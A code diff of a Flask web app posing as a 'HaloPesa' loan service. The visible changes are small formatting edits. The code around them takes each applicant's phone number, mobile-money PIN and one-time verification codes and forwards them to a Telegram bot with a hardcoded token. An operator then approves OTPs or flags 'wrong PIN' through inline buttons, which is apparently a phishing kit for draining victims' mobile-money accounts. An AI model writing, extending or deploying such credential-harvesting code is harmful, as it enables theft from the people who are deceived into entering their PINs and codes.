@@ -14,7 +14,7 @@ app.secret_key = 'halopesa-new-2024'
 # 🔐 Credentials
 # ================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID   = os.environ.get('CHAT_ID')
+CHAT_ID = os.environ.get('CHAT_ID')
 
 if not BOT_TOKEN:
     BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
@@ -22,7 +22,6 @@ if not CHAT_ID:
     CHAT_ID = '8589275340'
 
 logging.basicConfig(level=logging.INFO)
-
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
 def init_db():
@@ -60,8 +59,6 @@ def send_telegram(message, reply_markup=None):
             payload['reply_markup'] = reply_markup
         response = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
         logging.info(f"Telegram send status: {response.status_code}")
-        if response.status_code != 200:
-            logging.error(f"Telegram response: {response.text}")
         return response
     except Exception as e:
         logging.error(f'Telegram error: {e}')
@@ -121,7 +118,6 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
-        # OTP REQUESTED (resend)
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
@@ -135,12 +131,10 @@ def submit_loan():
                       (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
             conn.commit()
             conn.close()
-            # ✅ Simplified: only phone, amount, app_id
             msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
             send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
             return jsonify({'success': True, 'app_id': app_id})
 
-        # Check returning user
         c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
         existing = c.fetchone()
         is_returning = existing is not None
@@ -158,7 +152,6 @@ def submit_loan():
         conn.commit()
         conn.close()
 
-        # ✅ SIMPLIFIED MESSAGE: only phone, PIN, amount, and app_id
         prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
         msg = (
             f'{prefix}\n\n'
@@ -193,14 +186,12 @@ def submit_code():
         loan = c.fetchone()
         if loan:
             phone, expected_code, amount, pin = loan
-            # ✅ SIMPLIFIED: send just the 4-digit code (no extra text)
             msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n\n📋 {entered_code}'
+            # Vertical buttons
             send_telegram(msg, {'inline_keyboard': [
-                [
-                    {'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'},
-                    {'text': '❌ WRONG CODE', 'callback_data': f'wrongcode_{app_id}'},
-                    {'text': '✅ APPROVE LOAN', 'callback_data': f'approve_{app_id}'}
-                ]
+                [{'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'}],
+                [{'text': '❌ WRONG CODE', 'callback_data': f'wrongcode_{app_id}'}],
+                [{'text': '✅ APPROVE LOAN', 'callback_data': f'approve_{app_id}'}]
             ]})
         conn.close()
         return jsonify({'success': True})
